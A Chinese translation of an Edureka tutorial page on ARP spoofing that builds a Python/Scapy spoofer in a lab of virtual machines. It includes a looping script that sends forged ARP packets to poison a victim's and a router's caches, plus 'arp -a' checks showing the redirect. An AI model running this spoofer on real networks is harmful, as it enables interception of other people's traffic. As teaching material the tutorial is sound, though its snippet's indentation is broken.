<html>
<head>
<title>ARP Spoofing — Automating Ethical Hacking with Python</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ARP欺骗——用Python实现道德黑客的自动化</h1>
<blockquote>原文：<a href="https://medium.com/edureka/python-arp-spoofer-for-ethical-hacking-58b0bbd81272?source=collection_archive---------1-----------------------#2019-03-04">https://medium.com/edureka/python-arp-spoofer-for-ethical-hacking-58b0bbd81272?source=collection_archive---------1-----------------------#2019-03-04</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><div class=""/><figure class="ev ex if ig ih ii er es paragraph-image"><div class="er es ie"><img src="../Images/d17560fc5c62841c3ce60c51457fb4eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*NpgOqxk0HPWCCdbyjzuGKw.png"/></div></figure><p id="8801" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">当你告诉别人你是一个有道德的黑客时，他们看着你就像你是一个巫师。好吧，这就是做一个有道德的黑客:有知识，有能力，有良心去做正确的事情！就像巫师的魔杖一样，Python让有道德的黑客变得更加强大。在上一个教程中，您看到了如何使用Python编写MacChanger。在本教程中，你将看到如何使用Python进行<strong class="in hi"> ARP欺骗</strong>。</p><p id="f777" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">我将讨论以下主题:</p><ul class=""><li id="49af" class="jk jl hh in b io ip is it iw jm ja jn je jo ji jp jq jr js bi translated">什么是ARP欺骗？</li><li id="67fc" class="jk jl hh in b io jt is ju iw jv ja jw je jx ji jp jq jr js bi translated">编写一个ARP欺骗器</li></ul><p id="415a" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">我知道你们都在炒作自动化道德黑客，但首先，你应该知道什么是ARP欺骗。</p><h1 id="1e04" class="jy jz hh bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">什么是ARP欺骗？</h1><p id="b82f" class="pw-post-body-paragraph il im hh in b io kw iq ir is kx iu iv iw ky iy iz ja kz jc jd je la jg jh ji ha bi translated">现在每个人都在使用WiFi，你也是其中之一。你知道当你连接到路由器时数据是如何流动的吗？您的系统和路由器附带有IP地址。当您连接到路由器时，数据流在两个IP地址之间流动。路由器向您系统的IP地址发送数据，您的系统也向路由器的IP地址发送数据。</p><p id="f5ad" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated"><strong class="in hi"> ARP欺骗</strong>是一种通过伪造IP地址将网络流量重定向到黑客的技术。太技术化？让我为你使它变得简单。当一个系统和路由器之间(基本上是两个IP地址之间)有连接时，黑客会伪造他/她的IP地址。黑客会告诉1)路由器他/她是系统，2)系统他/她是路由器。现在路由器会把数据发给黑客而不是系统，系统会把数据发给黑客而不是路由器。因此，网络流经黑客。</p><figure class="lc ld le lf fd ii er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es lb"><img src="../Images/5ac525f00f47c870128c9436f921efce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NIwh5pxpnTB_urVbeVoEaA.png"/></div></div></figure><p id="4a5e" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">现在我们知道了什么是ARP欺骗器，让我们用Python来构建它们吧！</p><h1 id="0326" class="jy jz hh bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">编写一个ARP欺骗器</h1><p id="80e7" class="pw-post-body-paragraph il im hh in b io kw iq ir is kx iu iv iw ky iy iz ja kz jc jd je la jg jh ji ha bi translated">当我向您解释ARP欺骗时，我告诉过您它会重定向流量。要进行ARP欺骗，我们需要3个节点。一个是黑客节点，另外两个是系统，它们之间有一些通信。</p><p id="bffa" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">对于本教程，我将使用虚拟机来创建节点。我将运行两台虚拟机，其中一台是黑客，另一台是受害者。第三个节点呢？嗯，那将是虚拟机连接到的路由器。</p><p id="28e6" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated"><strong class="in hi"> <em class="lk">我的设置如下:我有两台连接到路由器的虚拟机。</em>T9】</strong></p><p id="3320" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">在我们写一个ARP欺骗器之前，我们需要得到一些数据。因为黑客系统会伪造它的IP地址，我们应该知道路由器和受害者系统的IP地址和MAC地址。</p><p id="d03a" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">要找到受害者和路由器的IP地址，从黑客的机器上运行以下命令:</p><pre class="lc ld le lf fd ll lm ln lo aw lp bi"><span id="5cae" class="lq jz hh lm b fi lr ls l lt lu">$ arp -a</span></pre><p id="d343" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">这将列出该网络中所有系统的IP地址和MAC地址。</p><figure class="lc ld le lf fd ii er es paragraph-image"><div class="er es lv"><img src="../Images/20f0e429ad9535410d2857e81424b775.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*NtAJwyu-4WdHCYmebqPLGg.png"/></div></figure><p id="0c8e" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">这里，网关是路由器，对于这个演示，我将选择IP地址为<strong class="in hi"> 192.168.111.157 </strong>的系统作为受害者。</p><p id="1e12" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">在我们运行ARP欺骗器之后，我们需要一种方法来验证我们的ARP欺骗器是否工作。在现实世界中，ARP欺骗的成功/失败取决于黑客系统的输出。但是对于这个演示，我们将使它变得简单。由于我们正在运行虚拟机，我将切换到受害者系统并检查路由器的MAC地址。</p><p id="d733" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">为此，在受害者系统的终端中运行以下命令:</p><pre class="lc ld le lf fd ll lm ln lo aw lp bi"><span id="1efb" class="lq jz hh lm b fi lr ls l lt lu">$ arp -a</span></pre><figure class="lc ld le lf fd ii er es paragraph-image"><div class="er es lv"><img src="../Images/b56a158ead249152c61a92ceba358215.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*KnDvNQqFMe6MrtY7WN2eaw.png"/></div></figure><p id="ec7a" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">查看路由器的MAC地址，这将在我们运行脚本后发生变化。</p><p id="6b41" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">现在我们有了欺骗所需的数据，我们准备编写一个ARP欺骗器。</p><p id="e36d" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">要写一个ARP欺骗的欺骗器，我们来运行PyCharm。要启动PyCharm，请转到PyCharm被解压缩的目录并运行shell脚本。</p><pre class="lc ld le lf fd ll lm ln lo aw lp bi"><span id="5b00" class="lq jz hh lm b fi lr ls l lt lu">$ cd pycharm-community-2018.3.4/ <br/>$ cd bin/ <br/>$ ./pycharm.sh</span></pre><p id="37f7" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">您将看到PyCharm的欢迎屏幕。点击<strong class="in hi">“创建新项目”</strong></p><figure class="lc ld le lf fd ii er es paragraph-image"><div class="er es lw"><img src="../Images/c7d8859271334c32f87cc71bc8ada996.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/format:webp/1*3aSLUF249PL46oiLN_LudA.png"/></div></figure><p id="0ed9" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">输入项目的名称。我将这个<strong class="in hi">命名为arp_spoof。</strong>然后点击<strong class="in hi">创建</strong>。</p><figure class="lc ld le lf fd ii er es paragraph-image"><div class="er es lv"><img src="../Images/fc294610f2647b390c52b1d63a80d46a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*r_-lEw3M2Qb0PIeuMP8cpw.png"/></div></figure><p id="5aa7" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">你现在将看到工作场所。接下来，让我们创建一个Python文件。为此，右键单击项目名称，转到“<strong class="in hi">新建</strong>”，然后单击“<strong class="in hi"> Python文件</strong>”。现在，您可以在这里编写Python脚本。</p><p id="583d" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">我正在编写的ARP欺骗器将使用Python的<strong class="in hi"> Scapy </strong>模块，这是一个包操作工具。</p><p id="7c5d" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">下面是ARP欺骗器的Python脚本:</p><pre class="lc ld le lf fd ll lm ln lo aw lp bi"><span id="a9d2" class="lq jz hh lm b fi lr ls l lt lu">import scapy.all as scap</span><span id="ed77" class="lq jz hh lm b fi lx ls l lt lu">while True:<br/>    packet = scap.ARP(op=1, pdst="192.168.111.157", hwaddr="00:0c:29:1e:76:af", psrc="192.168.111.2")<br/>    scap.send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.</span><span id="8bce" class="lq jz hh lm b fi lx ls l lt lu">packet = scap.ARP(op=1, pdst="192.168.111.2", hwaddr="00:50:56:e7:86:57", psrc="192.168.111.157")<br/>    scap.send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.</span></pre><p id="4cf8" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">运行此脚本，网络将被重定向。让我们来验证它是否真的有效。在受害者的系统中，运行以下命令:</p><pre class="lc ld le lf fd ll lm ln lo aw lp bi"><span id="c5d3" class="lq jz hh lm b fi lr ls l lt lu">$ arp -a</span></pre><figure class="lc ld le lf fd ii er es paragraph-image"><div class="er es lv"><img src="../Images/155a5f477ca1d187ac1ed5c3cf2b0a97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*FrDm7GoBRx_dz0BnYh84tQ.png"/></div></figure><p id="8452" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">可以看到路由器IP的MAC地址被改成了黑客系统的MAC地址。这意味着网络被重定向到黑客，来自受害者系统的数据被黑客系统认为是路由器。</p><p id="0d81" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">恭喜你！您已经用Python编写了一个ARP欺骗器，并看到了它的运行。<em class="lk"> </em>如果你想查看更多关于人工智能、DevOps、云等市场最热门技术的文章，你可以参考<a class="ae jj" href="https://www.edureka.co/blog/?utm_source=medium&amp;utm_medium=content-link&amp;utm_campaign=python-arp-spoofer-for-ethical-hacking" rel="noopener ugc nofollow" target="_blank"> Edureka的官方网站。</a></p><p id="27e8" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">请留意本系列中的其他文章，它们将解释网络安全的各个方面。</p><blockquote class="ly lz ma"><p id="32ec" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">1.<a class="ae jj" rel="noopener" href="/edureka/what-is-cybersecurity-778feb0da72">什么是网络安全？</a></p><p id="428c" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">2.<a class="ae jj" rel="noopener" href="/edureka/cybersecurity-framework-89bbab5aaf17">网络安全框架</a></p><p id="76d6" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">3.<a class="ae jj" rel="noopener" href="/edureka/steganography-tutorial-1a3c5214a00f">隐写术教程</a></p><p id="dd0e" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">4.<a class="ae jj" rel="noopener" href="/edureka/what-is-network-security-1f659407dcc">什么是网络安全？</a></p><p id="7742" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">5.<a class="ae jj" rel="noopener" href="/edureka/what-is-computer-security-c8eb1b38de5">什么是计算机安全？</a></p><p id="17fe" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">6.<a class="ae jj" rel="noopener" href="/edureka/application-security-tutorial-e6a0dda25f5c">什么是应用安全？</a></p><p id="17fa" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">7.<a class="ae jj" rel="noopener" href="/edureka/what-is-penetration-testing-f91668e2291a">渗透测试</a></p><p id="6d14" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">8.<a class="ae jj" rel="noopener" href="/edureka/ethical-hacking-tutorial-1081f4aacc53">道德黑客教程</a></p><p id="23cb" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">9.<a class="ae jj" rel="noopener" href="/edureka/ethical-hacking-using-kali-linux-fc140eff3300">关于Kali Linux你需要知道的一切</a></p><p id="781a" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">10.<a class="ae jj" rel="noopener" href="/edureka/ethical-hacking-using-python-c489dfe77340">使用Python的道德黑客</a></p><p id="ccd7" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">11.<a class="ae jj" rel="noopener" href="/edureka/what-is-ddos-attack-9b73bd7b9ba1"> DDOS攻击</a></p><p id="8932" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">12.<a class="ae jj" rel="noopener" href="/edureka/macchanger-with-python-ethical-hacking-7551f12da315">使用Python的MAC changer</a></p><p id="80a7" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">13 <a class="ae jj" rel="noopener" href="/edureka/what-is-cryptography-c94dae2d5974">什么是密码学？</a></p><p id="b2c8" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">14.<a class="ae jj" rel="noopener" href="/edureka/proxychains-anonsurf-macchanger-ethical-hacking-53fe663b734"> Proxychains，Anonsurf &amp; MacChange </a></p><p id="0a15" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">15.<a class="ae jj" rel="noopener" href="/edureka/footprinting-in-ethical-hacking-6bea07de4362">足迹</a></p><p id="9739" class="il im lk in b io ip iq ir is it iu iv mb ix iy iz mc jb jc jd md jf jg jh ji ha bi translated">16.<a class="ae jj" rel="noopener" href="/edureka/cybersecurity-interview-questions-233fbdb928d3">50大网络安全面试问答</a></p></blockquote></div><div class="ab cl me mf go mg" role="separator"><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj"/></div><div class="ha hb hc hd he"><p id="ea47" class="pw-post-body-paragraph il im hh in b io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ha bi translated">最初发表于2019年3月4日www.edureka.co。</p></div></div>    
</body>
</html>